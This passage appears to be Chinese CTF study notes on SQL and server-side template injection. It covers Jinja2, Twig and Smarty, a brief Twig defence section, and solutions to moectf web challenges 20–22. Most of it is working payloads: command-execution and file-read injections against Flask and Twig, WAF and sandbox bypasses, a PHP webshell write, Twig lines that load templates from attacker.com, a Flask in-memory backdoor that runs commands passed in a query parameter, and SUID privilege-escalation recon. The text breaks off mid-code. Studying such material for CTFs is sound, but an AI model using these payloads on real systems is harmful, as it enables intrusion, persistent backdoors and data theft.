1,group_concat(schema_name) from information_schema.schemata --</code></p><p>后台执行的语句就变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;1&quot; union select 1,group_concat(schema_name) from information_schema.schemata --&quot;</span><br></pre></td></tr></table></figure><p>这时候不仅会查询 <code>id=1</code>的数据，还会把所有数据库的名字一同查询出来。</p><p>同样的 <strong>「模板注入 SSTI(Server-Side Template Injection)」</strong> 也一样，**数据传递*<em>就是可控的输入点，以 *<em>Jinja2</em></em> 举例，Jinja2 在渲染的时候会把<code>{{}}</code>包裹的内容当做变量解析替换，所以当我们传入 <code>{{表达式}}</code> 时，表达式就会被渲染器执行。</p><p>比如下面的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    template = &#x27;&#x27;&#x27;</span><br><span class="line">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27; % (request.args.get(&#x27;name&#x27;))</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>当我们传入 {{9*9}} 时他会帮我们运算后输出 81</p><p><img src="/images/image-20231128141012093.png" alt="image-20231128141012093"></p><h2 id="Python模板注入一般流程¶"><a href="#Python模板注入一般流程¶" class="headerlink" title="Python模板注入一般流程¶"></a>Python模板注入一般流程<a href="https://hello-ctf.com/hc-web/ssti/#python">¶</a></h2><blockquote><p>注意模板注入是一种方式，它不归属于任何语言，不过目前遇见的大多数题目还是以python的SSTI为主，所以我们用 Python SSTI 为例子带各位熟悉模板注入。</p></blockquote><p>一般我们会在疑似的地方尝试插入简单的模板表达式，如 <code>{{7*7}}</code> <code>{{config}}</code>，看看是否能在页面上显示预期结果，以此确定是否有注入点。</p><p>当然本来还需要识别模板的，但大多数题目都是 Jinja2 就算，是其他模板，多也以Python为主，所以不会差太多，所以我们这里统一用 Jinja 来讲。</p><h3 id="引¶"><a href="#引¶" class="headerlink" title="引¶"></a>引<a href="https://hello-ctf.com/hc-web/ssti/#_5">¶</a></h3><p>很多时候，你在阅读SSTI相关的WP时，你会发现最后的payload都差不多长下面的样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125; </span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[257](&#x27;flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>逻辑：</p><p>比如我们现在就只拿到了 A，但我们想读取目录下面的 flag ，于是就有了下面的尝试：</p><p><strong>找对象A的类 - 类A</strong> -&gt; <strong>找类A的父亲 - 类B</strong> -&gt; <strong>找祖先&#x2F;基类 - 类O</strong>  -&gt; <strong>遍历祖先下面所有的子类</strong> -&gt; <strong>找到可利用的类 类F 类G</strong>-&gt;  <strong>构造利用方法</strong>-&gt;  <strong>读写文件&#x2F;执行命令</strong></p><p><strong>拿基类 -&gt; 找子类 -&gt; 构造命令执行或者文件读取负载 -&gt; 拿flag</strong> 是python模板注入的正常流程。</p><h3 id="来来来，分类，什么时候用什么请看好"><a href="#来来来，分类，什么时候用什么请看好" class="headerlink" title="来来来，分类，什么时候用什么请看好"></a>来来来，分类，什么时候用什么请看好</h3><p>不要像我一样把python的用到php里面了，</p><ol><li><strong>Jinja2 (Python):</strong> <code>{{7*7}}</code> 会得到 <code>49</code>，但 <code>{{7*&#39;7&#39;}}</code> 会得到 <code>7777777</code>（字符串重复）。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; request.application.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;env&quot;).read() &#125;&#125;</span><br><span class="line">&#123;% print(url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;))%&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>Twig (PHP):</strong> <code>{{7*7}}</code> 会得到 <code>49</code>，而 <code>{{7*&#39;7&#39;}}</code> 也会得到 <strong><code>49</code></strong>。</li></ol><ul><li><strong>原理：</strong> PHP 是弱类型语言，在进行算术运算时，它会自动把字符串 <code>&#39;7&#39;</code> 转换为数字 <code>7</code>。</li></ul><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1. 命令执行类 (RCE)</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;cat /flag&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;cat /flag&quot;, 0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;cat /flag&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;cat /flag&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat /flag&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">2. 文件读取类 (无命令执行时)</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;/flag&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/flag&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">3. 环境篡改与后门类</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">4. 木马写入类</span><br><span class="line">Twig</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php echo file_get_contents(&#x27;/flag&#x27;);?&gt;&quot;:&quot;/var/www/html/f.php&quot;&#125;|map(&quot;file_put_cont</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>Smarty (PHP):</strong> 通常只支持 <code>{7*7}</code>（单大括号）。</li></ol><h2 id="细讲twig注入："><a href="#细讲twig注入：" class="headerlink" title="细讲twig注入："></a>细讲twig注入：</h2><h3 id="1-测试流程"><a href="#1-测试流程" class="headerlink" title="1. 测试流程"></a>1. 测试流程</h3><ol><li>检测注入点 → 2. 判断沙盒状态 → 3. 尝试基础Payload → 4. 绕过沙盒 → 5. 提权</li></ol><h3 id="漏洞利用与Payload"><a href="#漏洞利用与Payload" class="headerlink" title="漏洞利用与Payload"></a>漏洞利用与Payload</h3><h3 id="1-非沙盒模式"><a href="#1-非沙盒模式" class="headerlink" title="1. 非沙盒模式"></a>1. 非沙盒模式</h3><h4 id="命令执行（需exec函数可用）"><a href="#命令执行（需exec函数可用）" class="headerlink" title="命令执行（需exec函数可用）"></a>命令执行（需<code>exec</code>函数可用）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;       </span><br><span class="line">&#123;&#123;[&#x27;cat /flag&#x27;]|map(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.read(1000)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="利用-self对象（旧版本）"><a href="#利用-self对象（旧版本）" class="headerlink" title="利用_self对象（旧版本）"></a>利用<code>_self</code>对象（旧版本）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.com&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;恶意模板&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-沙盒绕过技巧"><a href="#2-沙盒绕过技巧" class="headerlink" title="2. 沙盒绕过技巧"></a>2. 沙盒绕过技巧</h3><h4 id="使用内置过滤器链"><a href="#使用内置过滤器链" class="headerlink" title="使用内置过滤器链"></a>使用内置过滤器链</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)|join(&#x27;,&#x27;)&#125;&#125;  &lt;!-- 绕过黑名单检查 --&gt;</span><br></pre></td></tr></table></figure><h4 id="利用属性注入"><a href="#利用属性注入" class="headerlink" title="利用属性注入"></a>利用属性注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.query.filter(&#x27;system&#x27;,&#x27;id&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="模板继承攻击"><a href="#模板继承攻击" class="headerlink" title="模板继承攻击"></a>模板继承攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;http://attacker.com/malicious.twig&quot; %&#125; </span><br></pre></td></tr></table></figure><h3 id="3-其他Payload"><a href="#3-其他Payload" class="headerlink" title="3. 其他Payload"></a>3. 其他Payload</h3><p>• <strong>信息泄露</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;  &lt;!-- 泄露服务器变量 --&gt;</span><br><span class="line">&#123;&#123;_self&#125;&#125;                             &lt;!-- 转储_self对象 --&gt;</span><br></pre></td></tr></table></figure><p>• <strong>XSS利用</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;&#125;&#125;       &lt;!-- 需关闭自动转义 --&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="四、防御手段"><a href="#四、防御手段" class="headerlink" title="四、防御手段"></a>四、防御手段</h2><h3 id="1-官方推荐"><a href="#1-官方推荐" class="headerlink" title="1. 官方推荐"></a>1. 官方推荐</h3><p>• <strong>启用沙盒模式</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$policy = new \Twig\Sandbox\SecurityPolicy([], [], [], [], []);</span><br><span class="line">$twig-&gt;addExtension(new \Twig\Extension\SandboxExtension($policy, true));</span><br></pre></td></tr></table></figure><p>• <strong>输入过滤</strong>：避免用户输入直接控制模板内容。<br>• <strong>禁用危险函数</strong>：在<code>php.ini</code>中禁用<code>system</code>、<code>exec</code>等函数。</p><h3 id="2-安全配置"><a href="#2-安全配置" class="headerlink" title="2. 安全配置"></a>2. 安全配置</h3><p>• 更新至最新版本（≥Twig 3.x）。<br>• 使用白名单限制模板可访问的类和方法。<br>• 避免动态拼接模板内容。</p><hr><h2 id="五、绕过技巧"><a href="#五、绕过技巧" class="headerlink" title="五、绕过技巧"></a>五、绕过技巧</h2><h3 id="1-字符串拼接"><a href="#1-字符串拼接" class="headerlink" title="1. 字符串拼接"></a>1. 字符串拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;sy&#x27;~&#x27;stem&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-利用attribute函数"><a href="#2-利用attribute函数" class="headerlink" title="2. 利用attribute函数"></a>2. 利用<code>attribute</code>函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;attribute(_self, &#x27;env&#x27;)&#125;&#125;  &lt;!-- 访问受限属性 --&gt;</span><br></pre></td></tr></table></figure><h3 id="3-上下文逃逸"><a href="#3-上下文逃逸" class="headerlink" title="3. 上下文逃逸"></a>3. 上下文逃逸</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = &#x27;id&#x27; %&#125;</span><br><span class="line">&#123;&#123;&#123;cmd:[&#x27;system&#x27;]&#125;|json_encode&#125;&#125;  &lt;!-- 利用JSON解析漏洞 --&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="moectf-web-20-第二十章-幽冥血海·幻语心魔"><a href="#moectf-web-20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="moectf web 20 第二十章 幽冥血海·幻语心魔"></a>moectf web 20 第二十章 幽冥血海·幻语心魔</h2><p>怎么判断是不是ssti？</p><p>输入{{7*7}}，他甚至会帮你计算</p><p>举例：因为Jinja2 在渲染的时候会把<code>{{}}</code>包裹的内容当做变量解析替换，所以当我们传入 <code>{{表达式}}</code> 时，表达式就会被渲染器执行。</p><p>方法一：url拼接</p><p>通用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; request.application.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;env&quot;).read() &#125;&#125;</span><br><span class="line">&#123;% print(url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;))%&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>方法二：fenjing梭哈</p><p><a href="http://127.0.0.1:42803/?password=iwantflag%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%99%E4%B8%AA">http://127.0.0.1:42803/?password=iwantflag为什么是这个</a></p><p><a href="http://127.0.0.1:50032/?username=1&password=1">http://127.0.0.1:50032/?username=1&amp;password=1</a> 这个才是原格式</p><p>为什么不按照原格式来呢</p><table><thead><tr><th>URL 类型</th><th>作用</th><th>核心特点</th></tr></thead><tbody><tr><td>原格式 <code>50032/?username=1&amp;password=1</code></td><td>正常访问漏洞页面的 “示例”</td><td><code>username</code>&#x2F;<code>password</code>都是 “固定值”，无注入</td></tr><tr><td>利用格式 <code>42803/?password=iwantflag</code></td><td>漏洞利用的 “基础 URL”</td><td>仅保留必填的<code>password</code>固定值，留<code>username</code>作为注入位</td></tr></tbody></table><h3 id="因为username-要留作-“注入位”，不能写死为1"><a href="#因为username-要留作-“注入位”，不能写死为1" class="headerlink" title="因为username 要留作 “注入位”，不能写死为1"></a>因为<code>username</code> 要留作 “注入位”，不能写死为<code>1</code></h3><p>原始格式的 <code>username=1</code> 是 “固定值”，但漏洞利用的核心是<strong>把<code>username</code>的值换成 SSTI Payload</strong>：</p><ul><li><p>如果照搬原始格式写成 <code>?username=1&amp;password=iwantflag</code>，<code>username</code> 被固定为<code>1</code>，无法注入 Payload；</p></li><li><p>所以只保留 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=iwantflag</span><br></pre></td></tr></table></figure><p>得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:42803/?password=iwantflag&amp;username=恶意Payload</span><br></pre></td></tr></table></figure><p>passwd和usern位置反了？</p><p>“passwd 和 username 位置反了” 其实<strong>完全不影响漏洞利用</strong>——URL 参数的核心是「键值对存在且值正确」，而非「参数的先后顺序」</p><p>参考前面介绍里面的图，可以发现顺序不重要。</p><p>具体fenjing使用页面：图片删了</p></li></ul><h2 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a>21 第二十一章 往生漩涡·言灵死局</h2><p>输入{{7*7}}提示错误，知道被绕过</p><p>以此类推发现__和globals也被绕过</p><ol><li><p><code>{{</code>  <code>}}</code>  -&gt;   <code>{% print() %}</code> </p></li><li><p><code>__</code> 和 <code>globals</code>  -&gt;<code> &#39;_&#39;&#39;_&#39;&#39;glo&#39;&#39;bals&#39;&#39;_&#39;&#39;_&#39;</code></p></li><li><p>关于点访问和数组访问</p><table><thead><tr><th>写法 1（点访问）</th><th>写法 2（数组访问）</th><th></th></tr></thead><tbody><tr><td><code>lipsum.__globals__</code></td><td><code>lipsum[&#39;__globals__&#39;]</code></td><td></td></tr></tbody></table></li></ol><p>方法一:</p><p>原：</p><p><code>{{ lipsum.__globals__[&#39;os&#39;].popen(&#39;env&#39;).read() }}</code></p><p>现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;env&#x27;).read()) %&#125;</span><br><span class="line">&#123;% print(lipsum[&#x27;_&#x27;&#x27;_&#x27;&#x27;glo&#x27;&#x27;bals&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;env&#x27;).read()) %&#125;</span><br></pre></td></tr></table></figure><p>方法二：fejing</p><p>使用指南：</p><p>进入env文件夹后打开终端，输入：</p><p>激活命令：</p><p>&amp; “.\Scripts\Activate.ps1”</p><p>启动网页命令：</p><p>python -m fenjing webui</p><p>网页参数填写：</p><p>原：<a href="http://127.0.0.1:2775/?username=1&password=1">http://127.0.0.1:2775/?username=1&amp;password=1</a></p><p>输入url<a href="http://127.0.0.1:2775/?password=1">http://127.0.0.1:2775/?password=1</a></p><p>请求方式：get</p><p>表单输入：username</p><p>分析模式：快速</p><p>指令：cat &#x2F;flag</p><h2 id="moectf-web-22-第二十二章-血海核心·千年手段"><a href="#moectf-web-22-第二十二章-血海核心·千年手段" class="headerlink" title="moectf web 22 第二十二章 血海核心·千年手段"></a>moectf web 22 第二十二章 血海核心·千年手段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>知识点：</p><p>1.Flask ：</p><p>是 Python 的<strong>轻量级 Web 框架</strong>，核心作用是：帮你用几行 Python 代码，快速搭一个能通过浏览器访问的网站（服务器）。</p><p>1.1Flask 的一个核心特点：<strong>每次收到用户请求，都会按顺序执行 “钩子函数”+ 视图函数</strong>（比如<code>before_request</code>就是 “请求来之前先执行的函数”）。</p><p>2.内存马：</p><p>内存马 &#x3D; <strong>只存在于 服务器运行内存中 的后门</strong>（没有文件落地，而且服务器重启就会消失），核心是「偷偷给 Web 程序加一个 “隐藏功能”，只有你知道怎么触发」。</p><p>用生活例子类比：</p><ul><li>正常情况：你去奶茶店（服务器），只能点菜单上的饮品（正常功能）；</li><li>内存马：你偷偷和奶茶店员工（Web 程序）说 “以后我来只要说暗号‘QwQ’，你就帮我拿后厨的可乐（执行命令）”—— 这个 “暗号→拿可乐” 的规则，只存在员工脑子里（内存），没有写在菜单上（无文件），只有你知道，其他人不会发现。</li></ul><h3 id="1-2：核心：WAF-只认-“直接干坏事”-的请求，不认-“偷偷埋雷-后期触发”-的操作"><a href="#1-2：核心：WAF-只认-“直接干坏事”-的请求，不认-“偷偷埋雷-后期触发”-的操作" class="headerlink" title="1+2：核心：WAF 只认 “直接干坏事” 的请求，不认 “偷偷埋雷 + 后期触发” 的操作"></a>1+2：核心：WAF 只认 “直接干坏事” 的请求，不认 “偷偷埋雷 + 后期触发” 的操作</h3><ol><li><strong>直接执行命令（被拦）</strong>：</li></ol><p>你直接跟服务器说 “帮我执行 cat &#x2F;flag”，WAF 一眼就看出来你要干坏事，直接把你拦住，服务器根本收不到你的请求。</p><ol start="2"><li><strong>内存马（不被拦）</strong>：</li></ol><ul><li>第一步（埋雷）：你跟服务器说 “以后只要我传参数 a，你就执行 a 里的内容”—— 这话听起来就是 “设置一个规则”，没有直接说要读 flag，WAF 觉得你只是正常配置，服务器记住了这个规则（雷埋好了）；</li><li>第二步（踩雷）：你再跟服务器说 “a&#x3D;cat &#x2F;flag”—— 这话看起来就是 “传一个普通参数 a，值是 cat &#x2F;flag”，WAF 只看到你传了个参数，不知道服务器早就记了 “执行 a 里内容” 的规则，就又放行了；</li><li>结果：服务器收到 “a&#x3D;cat &#x2F;flag” 后，按之前埋的规则执行了命令，拿到 flag，但 WAF 全程没发现你在干坏事。</li></ul><p>3.内存马构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;a&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>url_for.__globals__</code>：Flask 内置函数<code>url_for</code>的全局变量空间（能拿到 Flask 的核心对象<code>app</code>）；</p></li><li><p><code>__builtins__[&#39;eval&#39;]</code>：Python 的内置执行函数（用来执行后面的字符串代码）；</p></li><li><p><code>app.before_request_funcs</code>：Flask 的 “请求前钩子”——<strong>每次收到 HTTP 请求，先执行这个钩子里的函数</strong>；</p></li><li><p>append(lambda: …)：往钩子里加一个匿名函数，逻辑是：</p><p>1.接收 GET 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure><p>（比如你传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=whoami</span><br></pre></td></tr></table></figure><p>）；</p><p>2.执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(参数a)</span><br></pre></td></tr></table></figure><p>（运行系统命令）；</p><p>3.读取命令执行结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read()</span><br></pre></td></tr></table></figure></li></ul><p>4.提权：“SUID 提权” </p><p>利用 setuid 位的<code>rev</code>程序</p><ol><li><p>SUID 位：临时拥有程序所有者（通常是 root）的权限</p></li><li><p>谁有suid位？找 SUID 程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>（遍历系统，找带 SUID 位的文件，忽略错误输出），只找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/rev</span><br></pre></td></tr></table></figure></li><li><p>什么是rev？</p><p>rev 程序的特殊之处：</p><p>题目里说&#x2F;usr&#x2F;bin有 rev 的 C 源码（核心是 rev 被设置了 SUID，且源码里有漏洞 &#x2F; 特殊逻辑）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=cat /usr/bin/rev.c&amp;password=1</span><br></pre></td></tr></table></figure><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    // 